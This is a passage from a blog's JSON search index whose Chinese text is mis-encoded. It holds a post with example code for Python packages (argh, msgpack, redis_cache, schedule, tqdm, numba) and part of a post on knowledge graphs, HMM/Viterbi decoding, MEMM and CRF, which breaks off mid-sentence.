åœ¨masterè¿è¡Œç¨‹åºå¾—åˆ°ç»“æœã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"CS","slug":"Notes/CS","permalink":"https://racleray.github.io/categories/Notes/CS/"}],"tags":[{"name":"ray","slug":"ray","permalink":"https://racleray.github.io/tags/ray/"},{"name":"distributed","slug":"distributed","permalink":"https://racleray.github.io/tags/distributed/"},{"name":"asyc","slug":"asyc","permalink":"https://racleray.github.io/tags/asyc/"}]},{"title":"æœ‰ç”¨çš„python package","slug":"æœ‰ç”¨çš„python-package","date":"2021-02-24T12:19:59.000Z","updated":"2023-08-07T11:54:31.046Z","comments":true,"path":"posts/4e471b0e.html","link":"","permalink":"https://racleray.github.io/posts/4e471b0e.html","excerpt":"è®°å½•å‡ ä¸ªæœ‰ç”¨çš„pythonåŒ…ã€‚arghå¤„ç†å‘½ä»¤è¡Œå‚æ•°ã€scheduleå®šæ—¶è¿è¡Œè„šæœ¬ç­‰ã€‚","text":"argh--æ‡’äººç‰ˆargparse 123456789101112131415161718192021import arghdef do_the_thing(required_arg, optional_arg=1, other_optional_arg=False): \"\"\" I am a docstring \"\"\" print((required_arg, type(required_arg))) print((optional_arg, type(optional_arg))) print((other_optional_arg, type(other_optional_arg)))@argh.arg('--bool-arg-for-flag', '-b', help=\"Flip this flag for things\")@argh.arg('arg_with_choices', choices=['one', 'two', 'three'])def do_the_other_thing(arg_with_choices, bool_arg_for_flag=False): print(arg_with_choices) print(bool_arg_for_flag)if __name__ == '__main__': # argh.dispatch_command(do_the_thing) argh.dispatch_commands([do_the_thing, do_the_other_thing]) msgpack--äºŒè¿›åˆ¶ç‰ˆjson 123456789101112131415161718192021222324252627282930313233343536373839404142import msgpackimport jsonimport randomdef msgpack_example_1(): example_dict = &#123;i: random.random() for i in range(10000)&#125; with open('json_file.json', 'w') as f: json.dump(example_dict, f) with open('json_file.json') as f: back_from_json = json.load(f) # Saving and loading with open('msgpack_file.msgpack', 'wb') as f: # f.write(msgpack.packb(example_dict)) # f.write(msgpack.packb(example_dict, use_single_float=True)) f.write(msgpack.packb(example_dict)) with open('msgpack_file.msgpack', 'rb') as f: back_from_msgpack = msgpack.unpackb(f.read()) # Data integrity print(type(next(iter(back_from_json.keys())))) print(type(next(iter(back_from_msgpack.keys()))))def msgpack_example_2(): list_of_dicts = [&#123;0: random.random()&#125; for i in range(100)] with open('streamed.msgpack', 'wb') as f: for d in list_of_dicts: f.write(msgpack.packb(d)) # è¿­ä»£è¯»å– with open('streamed.msgpack', 'rb') as f: loaded_list_of_dicts = [item for item in msgpack.Unpacker(f)] print(list_of_dicts[3][0], loaded_list_of_dicts[3][0])if __name__ == '__main__': # msgpack_example_1() msgpack_example_2() redis_cache--ä½¿ç”¨redisç¼“å­˜å‡½æ•° 12345678910111213141516171819# sudo apt install redis-server# sudo systemctl enable redis-server.service# sudo systemctl start redis-server.service# pip/pip3 install git+https://github.com/YashSinha1996/redis-simple-cache.gitimport timefrom redis_cache import cache_it, cache_it_json@cache_it(limit=1000, expire=5)def function_that_takes_a_long_time(i): print(f\"function was called with input &#123;i&#125;\") return i**2if __name__ == '__main__': for i in range(10): print(i, function_that_takes_a_long_time(2)) schedule--å®šæ—¶è¿è¡Œå‡½æ•° 1234567891011121314151617import timeimport scheduledef test_function(): print(f'test called at &#123;time.time()&#125;')def test_function_2(): print(f'test 2 called at &#123;time.time()&#125;')if __name__ == '__main__': schedule.every(1).seconds.do(test_function) schedule.every(3).seconds.do(test_function_2) # schedule.every(1).days.do(daily_task) # schedule.every().thursday.at(\"10:00\").do(day_time_task) while True: schedule.run_pending() tqdm--è¿›åº¦æ¡æ˜¾ç¤º 123456789101112131415161718192021222324252627282930313233343536373839404142434445from tqdm import tqdm, trangeimport randomimport timedef tqdm_example_1(): for i in tqdm(range(10)): time.sleep(0.2)def tqdm_example_2(): for i in trange(10, desc=\"outer_loop\"): for j in trange(10, desc=\"inner_loop\"): time.sleep(0.01)def tqdm_example_3(add_tot=False): max_iter = 100 tot = 0 if add_tot: bar = tqdm(desc=\"update example\", total=max_iter) else: bar = tqdm() while tot &lt; max_iter: update_iter = random.randint(1, 5) bar.update(update_iter) tot += update_iter time.sleep(0.03)def tqdm_example_4(): t = trange(100) for i in t: t.set_description(f\"on iter &#123;i&#125;\") time.sleep(0.02)if __name__ == \"__main__\": # tqdm_example_1() # tqdm_example_2() # tqdm_example_3() # tqdm_example_3(True) tqdm_example_4() Numba--çŸ©é˜µè¿ç®—åŠ é€Ÿ 12345678910111213141516171819202122232425262728293031323334353637383940414243import numpy as npfrom numba import njitfrom concurrent.futures import ThreadPoolExecutordef test_func(x): out=0 for i in range(100000000): out += i return outdef test_heavy_func(times): arr = np.random.rand(10000, 10000) return arr * arrif __name__ == \"__main__\": jitted_func = njit(test_func) jitted_func_2 = njit(test_heavy_func) # è®¡ç®—ä½¿ç”¨ jit å¹¶ å…³é—­ gilï¼Œæå‡çŸ©é˜µè¿ç®—é€Ÿåº¦ jitted_func_3 = njit(test_heavy_func, nogil=True) import time # start = time.time() # with ThreadPoolExecutor(4) as ex: # ex.map(jitted_func, range(1000)) # end = time.time() # print(\"[Python origin test] Used time: \", end - start) start = time.time() with ThreadPoolExecutor(4) as ex: ex.map(jitted_func_2, range(100)) end = time.time() print(\"[Numpy origin test] Used time: \", end - start) start = time.time() with ThreadPoolExecutor(4) as ex: ex.map(jitted_func_3, range(100)) end = time.time() print(\"[Numpy no gil test] Used time: \", end - start) æ³¨æ„ï¼šåœ¨numbaä¸­ä½¿ç”¨ä¸€ä¸ªæ™®é€šçš„pythonåˆ—è¡¨ä¸æ˜¯ä¸€ä¸ªå¥½ä¸»æ„ï¼Œå› ä¸ºå®ƒå°†èŠ±è´¹å¾ˆé•¿æ—¶é—´æ¥éªŒè¯ç±»å‹ã€‚ ä½¿ç”¨ndarrayï¼Œæ‰æ˜¯æ­£ç¡®çš„æ–¹æ³•ï¼æ‰èƒ½å¸¦æ¥é€Ÿåº¦çš„æå‡ã€‚ å¦å¤–ï¼Œ@vectorizeå¯ä»¥å°†å¤„ç†ä¸€ä¸ªå…ƒç´ çš„å‡½æ•°ï¼Œè½¬æ¢æˆå¯ä»¥æ¥å— arrayè¾“å…¥çš„ä¼˜åŒ–å‡½æ•°ï¼Œåªæ˜¯ç¬¬ä¸€æ¬¡ä½¿ç”¨éœ€è¦å¯¹å†…å­˜åˆ†é…è¿›è¡Œä¼˜åŒ–ï¼Œä¼šæ…¢ä¸€äº›ã€‚ 12345678@vectorize(nopython=True)def non_list_function(item): if item % 2 == 0: return 2 else: return 1 non_list_function(test_list) å¼¹ç°§é˜»å°¼ç³»ç»Ÿè®¡ç®—å®ä¾‹ 123456789101112131415161718192021222324def friction_fn(v, vt): if v &gt; vt: return - v * 3 else: return - vt * 3 * np.sign(v)def simulate_spring_mass_funky_damper(x0, T=10, dt=0.0001, vt=1.0): times = np.arange(0, T, dt) positions = np.zeros_like(times) v = 0 a = 0 x = x0 positions[0] = x0/x0 for ii in range(len(times)): if ii == 0: continue t = times[ii] a = friction_fn(v, vt) - 100*x v = v + a*dt x = x + v*dt positions[ii] = x/x0 return times, positions 1%time _ = simulate_spring_mass_funky_damper(0.1) è¿è¡Œ280msï¼Œå½“è¾“å…¥x0ä¸ºä»0åˆ°10000ï¼Œæ¯æ¬¡å¢åŠ 0.1ï¼Œéœ€è¦7ä¸ªå°æ—¶ 12345678910111213141516171819202122232425262728@njitdef friction_fn(v, vt): if v &gt; vt: return - v * 3 else: return - vt * 3 * np.sign(v)@njitdef simulate_spring_mass_funky_damper(x0, T=10, dt=0.0001, vt=1.0): times = np.arange(0, T, dt) positions = np.zeros_like(times) v = 0 a = 0 x = x0 positions[0] = x0/x0 for ii in range(len(times)): if ii == 0: continue t = times[ii] a = friction_fn(v, vt) - 100*x v = v + a*dt x = x + v*dt positions[ii] = x/x0 return times, positions_ = simulate_spring_mass_funky_damper(0.1) è¿è¡Œæ—¶é—´ 1.99 msï¼ŒåŠ é€Ÿ 200xã€‚ å†åŠ é€Ÿï¼š 12345# ä½¿ç”¨å¤šçº¿ç¨‹from concurrent.futures import ThreadPoolExecutorwith ThreadPoolExecutor(8) as ex: ex.map(simulate_spring_mass_funky_damper, np.arange(0, 1000, 0.1)) å½“è¾“å…¥x0ä¸ºä»0åˆ°1000ï¼Œæ¯æ¬¡å¢åŠ 0.1ï¼Œéœ€è¦19.3sã€‚ å†åŠ é€Ÿï¼Œåˆ©ç”¨å¤šæ ¸ï¼Œåœ¨çŸ©é˜µè¿ç®—æ—¶ï¼Œå…³é—­ GIL é”ï¼š 1234567891011121314151617181920212223242526272829@njit(nogil=True)def friction_fn(v, vt): if v &gt; vt: return - v * 3 else: return - vt * 3 * np.sign(v)@njit(nogil=True)def simulate_spring_mass_funky_damper(x0, T=10, dt=0.0001, vt=1.0): times = np.arange(0, T, dt) positions = np.zeros_like(times) v = 0 a = 0 x = x0 positions[0] = x0/x0 for ii in range(len(times)): if ii == 0: continue t = times[ii] a = friction_fn(v, vt) - 100*x v = v + a*dt x = x + v*dt positions[ii] = x/x0 return times, positions# compileï¼šå…ˆç¼–è¯‘ï¼Œé‚£ä¹ˆä½¿ç”¨æ—¶ï¼Œçœå»äº†è¿™æ®µæ—¶é—´_ = simulate_spring_mass_funky_damper(0.1) 1234from concurrent.futures import ThreadPoolExecutorwith ThreadPoolExecutor(8) as ex: ex.map(simulate_spring_mass_funky_damper, np.arange(0, 1000, 0.1)) å½“è¾“å…¥x0ä¸ºä»0åˆ°1000ï¼Œæ¯æ¬¡å¢åŠ 0.1ï¼Œéœ€è¦1.83sã€‚ ä¸ä½¿ç”¨å¤šçº¿ç¨‹ï¼Œä½¿ç”¨numbaè‡ªå¸¦çš„å¤šè¿›ç¨‹å¹¶è¡Œï¼Œä¹Ÿæ˜¯å¯ä»¥çš„ 12345678910from numba import prange@njit(nogil=True, parallel=True)def run_sims(end=1000): for x0 in prange(int(end/0.1)): if x0 == 0: continue simulate_spring_mass_funky_damper(x0*0.1) run_sims()","categories":[{"name":"Tools","slug":"Tools","permalink":"https://racleray.github.io/categories/Tools/"},{"name":"python","slug":"Tools/python","permalink":"https://racleray.github.io/categories/Tools/python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://racleray.github.io/tags/python/"},{"name":"tool","slug":"tool","permalink":"https://racleray.github.io/tags/tool/"}]},{"title":"æµ…æ¶‰çŸ¥è¯†å›¾è°±","slug":"æµ…æ¶‰çŸ¥è¯†å›¾è°±","date":"2021-02-22T13:16:40.000Z","updated":"2023-08-07T11:54:31.047Z","comments":true,"path":"posts/6a1e61f5.html","link":"","permalink":"https://racleray.github.io/posts/6a1e61f5.html","excerpt":"ç®€è¦è®°å½•äº†çŸ¥è¯†å›¾è°±åŸºæœ¬æ¦‚å¿µï¼ŒNERæ¨¡å‹æ–¹æ³•ï¼ˆHMMã€MEMMã€CRFï¼‰ï¼Œå…³ç³»åˆ†ç±»æ–¹æ³•ï¼ŒçŸ¥è¯†è¡¨ç¤ºï¼ˆTransç³»åˆ—ï¼‰ç­‰ã€‚","text":"åŸºæœ¬æ¦‚å¿µ â€œA knowledge graph consists of a set of interconnected typed entities and their attributes.â€ çŸ¥è¯†å›¾è°±ç”±ä¸€äº›ç›¸äº’è¿æ¥çš„å®ä½“å’Œä»–ä»¬çš„å±æ€§æ„æˆçš„ã€‚ æ˜¯ç”±ä¸€æ¡æ¡çŸ¥è¯†ç»„æˆï¼Œæ¯æ¡çŸ¥è¯†è¡¨ç¤ºä¸ºä¸€ä¸ª SPO ä¸‰å…ƒç»„ æŠ€æœ¯ä½“ç³»ç®€å›¾ï¼š SPOç›¸å…³ SPOä¸‰å…ƒç»„ï¼šï¼ˆå®ä½“ï¼Œå…³ç³»ï¼Œå®ä½“ï¼‰ï¼Œï¼ˆå®ä½“ï¼Œå±æ€§ï¼Œå­—é¢é‡ï¼‰ æ„å»ºçš„éš¾ç‚¹ä¹‹ä¸€å°±æ˜¯ï¼ŒSchemaè®¾è®¡ã€‚ è®¾è®¡çŸ¥è¯†å›¾è°±çš„ç»“æ„ï¼Œè¦æ„å»ºå“ªäº›ç±»åˆ«çš„å®ä½“ï¼Œå®ä½“æœ‰ä»€ä¹ˆå±æ€§ï¼Œå®ä½“é—´æœ‰ä»€ä¹ˆå…³ç³»ï¼Œå…³ç³»æœ‰ä»€ä¹ˆå±æ€§ SPOçš„èƒŒå RDF(Resource Description Framework)ï¼Œå³èµ„æºæè¿°æ¡†æ¶ï¼Œå…¶æœ¬è´¨æ˜¯ä¸€ä¸ªæ•°æ®æ¨¡å‹ï¼ˆData Modelï¼‰ã€‚RDFå½¢å¼ä¸Šè¡¨ç¤ºä¸ºSPOä¸‰å…ƒç»„ã€‚ RDFç”±èŠ‚ç‚¹å’Œè¾¹ç»„æˆï¼ŒèŠ‚ç‚¹è¡¨ç¤ºå®ä½“/èµ„æºã€å±æ€§ï¼Œè¾¹åˆ™è¡¨ç¤ºäº†å®ä½“å’Œå®ä½“ä¹‹é—´çš„å…³ç³»ä»¥åŠå®ä½“å’Œå±æ€§çš„å…³ç³»ã€‚ RDFçš„è¡¨è¾¾èƒ½åŠ›æœ‰é™ï¼Œæ— æ³•åŒºåˆ†ç±»å’Œå¯¹è±¡ï¼Œä¹Ÿæ— æ³•å®šä¹‰å’Œæè¿°ç±»çš„å…³ç³»/å±æ€§ã€‚å°±æ˜¯ä¸èƒ½åæ˜ ä¸€ä¸ª ç±» çš„ç‰¹å¾ä¿¡æ¯ã€‚ RDFS/OWL ç”¨æ¥æè¿°RDFæ•°æ®ã€‚RDFS/OWLåºåˆ—åŒ–æ–¹å¼å’ŒRDFæ²¡ä»€ä¹ˆä¸åŒï¼Œå…¶å®åœ¨è¡¨ç°å½¢å¼ä¸Šï¼Œå®ƒä»¬å°±æ˜¯RDFã€‚ RDFSï¼Œå³â€œResource Description Framework Schemaâ€ï¼Œæ˜¯æœ€åŸºç¡€çš„æ¨¡å¼è¯­è¨€ã€‚å®šä¹‰äº†ç±»ï¼Œå°†ç±»è¿›è¡ŒæŠ½è±¡ã€‚ RDFSçš„è¡¨è¾¾èƒ½åŠ›è¿˜æ˜¯ç›¸å½“æœ‰é™ï¼Œå› æ­¤æå‡ºäº†OWLï¼ŒWeb Ontology Languageã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥æŠŠOWLå½“åšæ˜¯RDFSçš„ä¸€ä¸ªæ‰©å±•ï¼Œå…¶æ·»åŠ äº†é¢å¤–çš„é¢„å®šä¹‰è¯æ±‡ã€‚ owlåŒºåˆ†æ•°æ®å±æ€§å’Œå¯¹è±¡å±æ€§ï¼ˆå¯¹è±¡å±æ€§è¡¨ç¤ºå®ä½“å’Œå®ä½“ä¹‹é—´çš„å…³ç³»ï¼‰ã€‚ OWL ä½¿ç”¨åœºæ™¯ï¼šæœ¬ä½“ç»“æ„ä¸­æœ‰å¤§é‡ç›¸äº’é“¾æ¥çš„ç±»å’Œå±æ€§ï¼Œè®¾è®¡è€…æƒ³ç”¨è‡ªåŠ¨æ¨ç†æœºå¾—åˆ°é‡Œé¢å¤æ‚çš„å…³ç³»ã€‚éœ€è¦ç»“åˆåŸºäºè§„åˆ™çš„æ¨ç†å¼•æ“ï¼ˆrule-based reasoning engineï¼‰çš„åœºåˆã€‚ å‘½åå®ä½“è¯†åˆ« æ¦‚ç‡å›¾æ–¹æ³• æœ‰å‘å›¾ â½†å‘å›¾ æ¦‚ç‡â½†æ— å‘å›¾æ¨¡å‹ï¼Œâ¼œç§°ä¸ºâ»¢é©¬å°”å¯å¤«éšæœºåœº å®ƒå‡è®¾éšæœºåœºä¸­ä»»æ„â¼€ä¸€ä¸ªç»“ç‚¹çš„èµ‹å€¼ï¼Œä»…ä»…å’Œå®ƒçš„é‚»ç»“ç‚¹çš„å–å€¼æœ‰å…³ï¼Œå’Œä¸ï¥§ç›¸é‚»çš„ç»“ç‚¹çš„å–å€¼æ— å…³ã€‚â½†å‘å›¾Gä¸­ä»»ä½•ä¸¤ä¸ªç»“ç‚¹å‡æœ‰è¾¹è¿æ¥çš„ç»“ç‚¹â¼¦é›†ç§°ä¸ºå›¢ã€‚ è‹¥Cæ˜¯â½†å‘å›¾çš„â¼€ä¸ªå›¢ï¼Œä¸”ä¸èƒ½å†åŠ è¿›ä»»ä½•ä¸€ä¸ªGçš„ç»“ç‚¹ä½¿å…¶æˆä¸ºæ›´å¤§çš„â¼€ä¸ªå›¢ï¼Œåˆ™æ­¤Cä¸ºæœ€â¼¤å›¢ã€‚ è”åˆæ¦‚ç‡å¯ä»¥è¡¨ç¤ºä¸ºå…¶æœ€å¤§å›¢C éšæœºå˜é‡çš„å‡½æ•°çš„ä¹˜ç§¯ã€‚ æˆå¯¹â»¢é©¬å°”å¯å¤«æ€§ï¼šæ²¡æœ‰ç›´è¿è¾¹çš„ä»»æ„ä¸¤ä¸ªèŠ‚ç‚¹æ˜¯ç‹¬ç«‹çš„ã€‚ å±€éƒ¨â»¢é©¬å°”å¯å¤«æ€§ï¼šç»™å®šç›´è¿èŠ‚ç‚¹æ—¶ï¼Œä¸­å¿ƒèŠ‚ç‚¹å’Œå…¶ä»–èŠ‚ç‚¹æ¡ä»¶ç‹¬ç«‹ã€‚ å…¨å±€â»¢é©¬å°”å¯å¤«æ€§ï¼šç»™å®šä¸€ä¸ªèŠ‚ç‚¹é›†åˆå°†å…¨é›†åˆ’åˆ†ä¸ºä¸¤ä¸ªç‹¬ç«‹é›†åˆæ—¶ï¼Œä¸¤ä¸ªç‚¹é›†çš„ä»»æ„å­é›†ï¼Œæ˜¯ç›¸äº’ç‹¬ç«‹çš„ã€‚ HMM HMMæ˜¯â½¤ç”¨äºæè¿°ç”±éšè—çš„çŠ¶æ€åºåˆ—ï¦œå’Œæ˜¾æ€§ çš„è§‚æµ‹åºåˆ—ï¦œç»„åˆâ½½è€Œæˆçš„åŒé‡éšæœºè¿‡ç¨‹ã€‚ é€šè¿‡å¯è§‚æµ‹åˆ°çš„æ•°æ®ï¼Œé¢„æµ‹ä¸ï¥§å¯è§‚æµ‹åˆ°çš„çŠ¶æ€æ•°æ®ã€‚ HMMçš„å‡è®¾â¼€ï¼šâ»¢é©¬å°”å¯å¤«æ€§å‡è®¾ã€‚å½“å‰æ—¶åˆ»çš„çŠ¶æ€å€¼ï¼Œä»…ä¾èµ–äºå‰ â¼€æ—¶åˆ»çš„çŠ¶æ€å€¼ï¼Œâ½½ä¸ä¾èµ–äºæ›´æ—©æ—¶åˆ»çš„çŠ¶æ€å€¼ã€‚ HMMçš„å‡è®¾â¼†ï¼šâ»¬æ¬¡æ€§å‡è®¾ã€‚çŠ¶æ€è½¬ç§»æ¦‚ç‡çŸ©é˜µä¸æ—¶é—´â½†å…³ã€‚å³æ‰€ æœ‰æ—¶åˆ»å…±äº«åŒâ¼€ä¸ªçŠ¶æ€è½¬ç§»çŸ©é˜µã€‚ HMMçš„å‡è®¾ä¸‰ï¼šè§‚æµ‹ç‹¬â½´ç«‹æ€§å‡è®¾ã€‚å½“å‰æ—¶åˆ»çš„è§‚å¯Ÿå€¼ï¼Œä»…ä¾èµ–äºå½“ å‰æ—¶åˆ»çš„çŠ¶æ€å€¼ã€‚ æ­¤å¤„çš„é—®é¢˜æ˜¯ï¼Œé¢„æµ‹éšçŠ¶æ€åºåˆ—ï¼ˆå‡è®¾æ¨¡å‹å‚æ•°å·²ç»å­¦ä¹ å¾—åˆ°ï¼‰ã€‚å®ä¾‹æ¼”ç¤ºï¼š å·²çŸ¥ï¼š çŠ¶æ€å€¼é›†åˆï¼š{æ™´å¤©ï¼Œé˜´å¤©ï¼Œâ¾¬é›¨å¤©}ï¼›è§‚æµ‹å€¼é›†åˆï¼š{å®…ï¼Œæ‰“çƒ}ï¼› è¿‡å»çŠ¶æ€å€¼åºåˆ—ï¼š{æ™´æ™´æ™´é˜´â¾¬é›¨æ™´}ï¼›å¯¹åº”è§‚æµ‹å€¼åºåˆ—ï¼š{çƒå®…å®…çƒå®…å®…}ï¼› ä»å†å²æ•°æ®å­¦ä¹ ï¼Œå·²å¾—åˆ°æ¨¡å‹å‚æ•°ä¸ºï¼š æ±‚å½“è§‚æµ‹åºåˆ—æ˜¯{å®…çƒå®…}ï¼Œæœ€æœ‰å¯èƒ½çš„å¤©â½“çŠ¶å†µåºåˆ—ï¼Ÿï¼ˆåŠ¨æ€è§„åˆ’æ±‚è§£æ¦‚ç‡æœ€â¼¤å¤§è·¯ï¤·å¾„ï¼‰ æ±‚è§£è¿‡ç¨‹ï¼š å®šä¹‰: å®šä¹‰åœ¨æ—¶åˆ»tçŠ¶æ€ä¸ºiçš„æ‰€æœ‰å•ä¸ªè·¯å¾„ï¼ˆi1ï¼Œi2ï¼Œ... it )ä¸­çš„æ¦‚ç‡æœ€å¤§å€¼ä¸º t+1æ—¶åˆ»çš„æœ€å¤§æ¦‚ç‡: å†å®šä¹‰â¼€ä¸ªå˜é‡ï¼Œâ½¤æ¥å›æº¯æœ€â¼¤è·¯å¾„ï¼šåœ¨æ—¶åˆ»tçŠ¶æ€içš„æ‰€æœ‰å•ä¸ªè·¯å¾„ï¼ˆi1ï¼Œi2ï¼Œï¼Œï¼Œ it-1,it)ä¸­ï¼Œæ¦‚ç‡æœ€â¼¤çš„è·¯ï¤·å¾„ç¬¬t-1ä¸ªèŠ‚ç‚¹ä¸ºï¼ˆåœ¨tæ—¶åˆ»é€‰å‡ºä¸Šä¸€ä¸ªæ—¶åˆ»çš„æœ€ä¼˜è·¯å¾„ï¼‰ï¼š è®¡ç®—ç¬¬ä¸€å¤© \\(\\delta_1\\)ï¼ˆé›¨å¤©ï¼‰= \\(\\pi\\)(é›¨å¤©) * B(é›¨å¤©ï¼Œå®…) = 0.28 \\(\\delta_1\\)ï¼ˆé˜´å¤©ï¼‰= \\(\\pi\\)(é˜´å¤©) * B(é˜´å¤©ï¼Œå®…) = 0.16 \\(\\delta_1\\)ï¼ˆæ™´å¤©ï¼‰= \\(\\pi\\)(æ™´å¤©) * B(æ™´å¤©ï¼Œå®…) = 0.1 ç¬¬äºŒå¤© \\(\\delta_2\\)ï¼ˆé›¨å¤©ï¼‰= \\(\\max\\)( [\\(\\delta_1\\)(é›¨å¤©) * A(é›¨å¤©ï¼Œé›¨å¤©)ï¼Œ \\(\\delta_1\\)(é˜´å¤©) * A(é˜´å¤©ï¼Œé›¨å¤©)ï¼Œ \\(\\delta_1\\)(æ™´å¤©) * A(æ™´å¤©ï¼Œé›¨å¤©)]) * B(é›¨å¤©ï¼Œæ‰“çƒ) = 0.042 â€‹ å‰ä¸€æ—¶åˆ»é€‰æ‹©ï¼Œé›¨å¤© \\(\\delta_2\\)ï¼ˆé˜´å¤©ï¼‰= \\(\\max\\)( [\\(\\delta_1\\)(é›¨å¤©) * A(é›¨å¤©ï¼Œé˜´å¤©)ï¼Œ \\(\\delta_1\\)(é˜´å¤©) * A(é˜´å¤©ï¼Œé˜´å¤©)ï¼Œ \\(\\delta_1\\)(æ™´å¤©) * A(æ™´å¤©ï¼Œé˜´å¤©)]) * B(é˜´å¤©ï¼Œæ‰“çƒ) = 0.0504 â€‹ å‰ä¸€æ—¶åˆ»é€‰æ‹©ï¼Œé›¨å¤© \\(\\delta_2\\)ï¼ˆæ™´å¤©ï¼‰= \\(\\max\\)( [\\(\\delta_1\\)(é›¨å¤©) * A(é›¨å¤©ï¼Œæ™´å¤©)ï¼Œ \\(\\delta_1\\)(é˜´å¤©) * A(é˜´å¤©ï¼Œæ™´å¤©)ï¼Œ \\(\\delta_1\\)(æ™´å¤©) * A(æ™´å¤©ï¼Œæ™´å¤©)]) * B(æ™´å¤©ï¼Œæ‰“çƒ) = 0.028 â€‹ å‰ä¸€æ—¶åˆ»é€‰æ‹©ï¼Œé›¨å¤© ç¬¬ä¸‰å¤© \\(\\delta_3\\)ï¼ˆé›¨å¤©ï¼‰= \\(\\max\\)( [\\(\\delta_2\\)(é›¨å¤©) * A(é›¨å¤©ï¼Œé›¨å¤©)ï¼Œ \\(\\delta_2\\)(é˜´å¤©) * A(é˜´å¤©ï¼Œé›¨å¤©)ï¼Œ \\(\\delta_2\\)(æ™´å¤©) * A(æ™´å¤©ï¼Œé›¨å¤©)]) * B(é›¨å¤©ï¼Œæ‰“çƒ) = 0.0147 â€‹ å‰ä¸€æ—¶åˆ»é€‰æ‹©ï¼Œé›¨å¤© \\(\\delta_3\\)ï¼ˆé˜´å¤©ï¼‰= \\(\\max\\)( [\\(\\delta_2\\)(é›¨å¤©) * A(é›¨å¤©ï¼Œé˜´å¤©)ï¼Œ \\(\\delta_2\\)(é˜´å¤©) * A(é˜´å¤©ï¼Œé˜´å¤©)ï¼Œ \\(\\delta_2\\)(æ™´å¤©) * A(æ™´å¤©ï¼Œé˜´å¤©)]) * B(é˜´å¤©ï¼Œæ‰“çƒ) = 0.01008 â€‹ å‰ä¸€æ—¶åˆ»é€‰æ‹©ï¼Œé˜´å¤© \\(\\delta_3\\)ï¼ˆæ™´å¤©ï¼‰= \\(\\max\\)( [\\(\\delta_2\\)(é›¨å¤©) * A(é›¨å¤©ï¼Œæ™´å¤©)ï¼Œ \\(\\delta_2\\)(é˜´å¤©) * A(é˜´å¤©ï¼Œæ™´å¤©)ï¼Œ \\(\\delta_2\\)(æ™´å¤©) * A(æ™´å¤©ï¼Œæ™´å¤©)]) * B(æ™´å¤©ï¼Œæ‰“çƒ) = 0.00756 â€‹ å‰ä¸€æ—¶åˆ»é€‰æ‹©ï¼Œé˜´å¤© æœ€åï¼Œé€‰æ‹©t3æ—¶åˆ»æœ€å¤§è·¯å¾„ï¼Œé›¨å¤©ã€‚å›æº¯ç»“æœä¸ºï¼Œ{é›¨å¤©ï¼Œé›¨å¤©ï¼Œé›¨å¤©} HMMçš„ç¼ºé™· â»¢å°”å¯å¤«æ€§ï¼ˆæœ‰é™å†å²æ€§ï¼‰ï¼šå®é™…ä¸Šåœ¨NLPé¢†åŸŸçš„æ–‡æœ¬æ•°æ®ï¼Œå¾ˆå¤šè¯è¯­éƒ½æ˜¯æœ‰â»“ä¾èµ–çš„ã€‚ é½æ¬¡æ€§ï¼šåºåˆ—ï¦œï¥§åŒä½ç½®çš„çŠ¶æ€è½¬ç§»çŸ©é˜µå¯èƒ½ä¼šæœ‰æ‰€å˜åŒ–ï¼Œå³ä½ç½®ä¿¡æ¯ä¼šå½±å“é¢„æµ‹ç»“æœã€‚ è§‚æµ‹ç‹¬ç«‹æ€§ï¼šè§‚æµ‹å€¼å’Œè§‚æµ‹å€¼ï¼ˆå­—ä¸å­—ï¼‰ä¹‹é—´æ˜¯æœ‰ç›¸å…³æ€§çš„ã€‚ å•å‘å›¾ï¼šåªä¸å‰åºçŠ¶æ€æœ‰å…³ï¼Œå’Œåç»­çŠ¶æ€æ— å…³ã€‚åœ¨NLPä»»åŠ¡ä¸­ï¼Œä¸Šä¸‹æ–‡çš„ä¿¡æ¯éƒ½æ˜¯å¿…é¡»çš„ã€‚ æ ‡è®°åç½®Label Biasï¼šè‹¥çŠ¶æ€Aèƒ½å¤Ÿå‘Nç§çŠ¶æ€è½¬ç§»ï¼ŒçŠ¶æ€Bèƒ½å¤Ÿå‘Mç§çŠ¶æ€è½¬ç§»ã€‚è‹¥N&lt;&lt;Mï¼Œåˆ™é¢„æµ‹åºï¦œï¤æœ‰å¯èƒ½é€‰æ‹©çŠ¶æ€Aï¼Œå› ä¸ºAçš„å±€éƒ¨è½¬ç§»æ¦‚ç‡è¾ƒå¤§ MEMMæœ€å¤§ç†µé©¬å°”å¯å¤«æ¨¡å‹ è§£å†³äº†è§‚æµ‹ç‹¬ç«‹é—®é¢˜ï¼Œä½†æ˜¯ä¾ç„¶å­˜åœ¨æ ‡è®°åç½®ã€‚ æœ€å¤§ç†µï¼ˆç†µï¼šåˆ†å¸ƒçš„ä¸ç¡®å®šæ€§ï¼‰ï¼š â€œæ— çŸ¥æ¯”é”™è¯¯æ›´å¯å–ï¼Œä¸€ä¸ªä»€ä¹ˆéƒ½ä¸ç›¸ä¿¡çš„äººæ¯”ä¸€ä¸ªç›¸ä¿¡é”™è¯¯çš„äººç¦»çœŸç†æ›´è¿‘â€ æ‰¾åˆ°æœ€ä¼˜åˆ†å¸ƒä¸­ï¼Œæœ€åå‘ uniform çš„ç»“æœï¼Œå³ä¸ºæœ€å¤§ç†µçš„ç›®æ ‡ã€‚ Hï¼ˆxï¼‰=â€“âˆ‘x log xæ˜¯å‡¸å‡½æ•° æœ€å¤§ç†µæ¨¡å‹çš„likeliihoodå½¢å¼ä¸ºï¼š æ±‚å¯¼ä¹‹åå¯ä»¥å‘ç°ï¼š MEMMï¼š æ ¹æ®å†å²çŠ¶æ€åºåˆ—ï¼Œé¢„æµ‹å½“å‰çŠ¶æ€ï¼Œæ¯ä¸€æ—¶é—´æ­¥ï¼Œé¢„æµ‹ä¸€ä¸ªçŠ¶æ€ã€‚ CRF åœ¨ç»™å®šéšæœºå˜ï¥¾åºåˆ—Xçš„æƒ…å†µä¸‹ï¼Œéšæœºå˜é‡Yçš„æ¡ä»¶æ¦‚ç‡åˆ†å¸ƒP(Y|X)æ„æˆæ¡ä»¶éšæœºåœºï¼Œå³æ»¡â¾œè¶³é©¬å°”å¯å¤«æ€§ï¼š P(Yi| X,Y1,Y2,...Yn) = P(Yi| X,Yiâˆ’1,Yi+1) åˆ™ç§°P(Y|X)ä¸ºçº¿æ€§é“¾æ¡ä»¶éšæœºåœºã€‚ ä¼ ç»Ÿçš„CRFå®šä¹‰å¦‚ä¸‹ï¼š ç‰¹å¾å‡½æ•°åˆ†ä¸ºä¸¤ç±» 